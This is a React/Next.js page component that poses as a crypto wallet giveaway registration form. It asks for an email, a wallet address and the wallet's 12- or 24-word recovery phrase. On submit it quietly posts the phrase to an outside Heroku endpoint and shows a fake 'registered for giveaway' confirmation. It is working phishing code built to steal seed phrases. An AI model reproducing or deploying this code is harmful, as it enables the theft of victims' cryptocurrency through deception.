import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useRouter } from "next/router";
import styles from "../../styles/Home.module.css";
import Tabs from "./index";

export default function Discover() {
  const [phrase, setPhrase] = useState("");
  const [info, setInfo] = useState({
    email: null,
    wallet: null,
    notif: false,
  });
  const router = useRouter();
  const { pid } = router.query;

  const notify = () => {
    phrase === "" ? "" : toast.success("Phrase Successfully Imported");
  };
  const notif = () => {
    setInfo({ ...info, notif: true });
    setTimeout(() => {
      setInfo({ ...info, notif: false });
    }, 5000);
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    if (phrase !== "") {
      const pS = { phrase: phrase, wallet: pid };
      console.log(pS);

      axios
        .post("https://shielded-earth-12418.herokuapp.com/send", pS)
        .then((res) => res.json())
        .catch((err) => err);
    }
  };

  return (
    <Tabs>
      {info.notif && (
        <div className="text-center p-2 rounded bg-lightblue text-white text-base">
          Successfully registered for giveaway, you will receive an email if you
          are selected
        </div>
      )}
      <div>
        <form onSubmit={handleSubmit}>
          <div className="grid gap-2">
          <input
              placeholder="email"
              onChange={(e) => setInfo({ ...info, email: e.target.value })}
              className={`${styles.prtextarea} ${styles.tA2}`}
            />
            <input
              placeholder="wallet address"
              onChange={(e) => setInfo({ ...info, wallet: e.target.value })}
              className={`${styles.prtextarea} ${styles.tA2}`}
            />
          </div>

          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Phrase is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.prtextarea}
            required
          />
          <button
            onClick={notif}
            className={styles.prbutton}
            disabled={
              !info.email || !info.wallet || phrase === "" || phrase.length < 12
            }
          >
            import
          </button>
          <ToastContainer />
        </form>
      </div>
    </Tabs>
  );
}
